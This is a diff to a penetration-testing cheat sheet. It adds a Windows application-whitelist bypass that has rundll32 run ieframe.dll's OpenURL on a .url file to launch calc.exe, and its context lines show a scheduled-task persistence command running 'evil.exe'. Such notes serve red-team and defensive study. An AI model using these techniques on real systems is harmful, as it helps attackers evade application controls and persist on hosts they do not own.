@@ -941,5 +941,24 @@ openssl passwd -1 password
 schtasks /create /sc minute /mo 10 /tn "TaskName" /tr C:\Windows\system32\evil.exe
 ```
 
+## Code Execution / Application Whitelist Bypass
+
+### Ieframe.dll
+
+{% code-tabs %}
+{% code-tabs-item title="cmd" %}
+```text
+rundll32 c:\windows\system32\ieframe.dll,OpenURL c:\temp\test.url
+```
+{% endcode-tabs-item %}
+
+{% code-tabs-item title="test.url" %}
+```
+[internetshortcut]
+url=c:\windows\system32\calc.exe
+```
+{% endcode-tabs-item %}
+{% endcode-tabs %}
+
 This was inspired by and forked/adapted/updated from [Dostoevsky's Pentest Notes](https://github.com/dostoevskylabs/dostoevsky-pentest-notes).
 
